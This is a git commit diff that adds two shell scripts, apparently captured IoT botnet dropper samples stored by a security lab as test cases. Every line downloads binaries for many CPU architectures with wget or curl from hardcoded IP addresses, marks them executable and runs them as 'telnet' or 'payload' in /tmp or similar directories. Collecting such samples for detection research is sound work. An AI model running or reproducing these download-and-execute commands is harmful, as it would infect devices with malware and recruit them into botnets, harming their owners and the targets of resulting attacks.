f3ebf4f3535197ccb9563dedfecbc7b86f830989
siqlab <sangay@vairav.net>
2023-10-10 01:35:03 -0700

    Added T02 & T03 for B02-Oct-10-2023

---
+++ T02-B02-AR-Oct-10-2023/BASE-T01-B01-I01-AR-VM1-P16-.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+busybox wget http://45.88.90.115/x8.n; curl -O http://45.88.90.115/x8.n;chmod 777 x8.n;./x8.n telnet
+busybox wget http://45.88.90.115/x6.n; curl -O http://45.88.90.115/x6.n;chmod 777 x6.n;./x6.n telnet
+busybox wget http://45.88.90.115/sp.n; curl -O http://45.88.90.115/sp.n;chmod 777 sp.n;./sp.n telnet
+busybox wget http://45.88.90.115/sh.n; curl -O http://45.88.90.115/sh.n;chmod 777 sh.n;./m.nn telnet
+busybox wget http://45.88.90.115/pp.n; curl -O http://45.88.90.115/pp.n;chmod 777 pp.n;./pp.n telnet
+busybox wget http://45.88.90.115/mp.n; curl -O http://45.88.90.115/mp.n;chmod 777 mp.n;./mp.n telnet
+busybox wget http://45.88.90.115/mip.n; curl -O http://45.88.90.115/mip.n;chmod 777 mip.n;./mip.n telnet
+busybox wget http://45.88.90.115/m6.n; curl -O http://45.88.90.115/m6.n;chmod 777 m6.n;./m6.n telnet
+busybox wget http://45.88.90.115/a7.n; curl -O http://45.88.90.115/a7.n;chmod 777 a7.n;./a7.n telnet
+busybox wget http://45.88.90.115/a6.n; curl -O http://45.88.90.115/a6.n;chmod 777 a6.n;./a6.n telnet
+busybox wget http://45.88.90.115/a5.n; curl -O http://45.88.90.115/a5.n;chmod 777 a5.n;./a5.n telnet
+busybox wget http://45.88.90.115/a.n; curl -O http://45.88.90.115/a.n;chmod 777 a.n;./a.n telnet
---
+++ T02-B02-AR-Oct-10-2023/BASE-T01-B01-I01-AR-VM1-P18-.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/x86; curl -O http://5.181.80.97/bins/x86;cat x86 >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/mips; curl -O http://5.181.80.97/bins/mips;cat mips >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/mpsl; curl -O http://5.181.80.97/bins/mpsl;cat mpsl >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm4; curl -O http://5.181.80.97/bins/arm4;cat arm4 >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm5; curl -O http://5.181.80.97/bins/arm5;cat arm5 >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm6; curl -O http://5.181.80.97/bins/arm6;cat arm6 >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm7; curl -O http://5.181.80.97/bins/arm7;cat arm7 >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/ppc; curl -O http://5.181.80.97/bins/ppc;cat ppc >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/m68k; curl -O http://5.181.80.97/bins/m68k;cat m68k >robben;chmod +x *;./robben payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/sh4; curl -O http://5.181.80.97/bins/sh4;cat sh4 >robben;chmod +x *;./robben payload
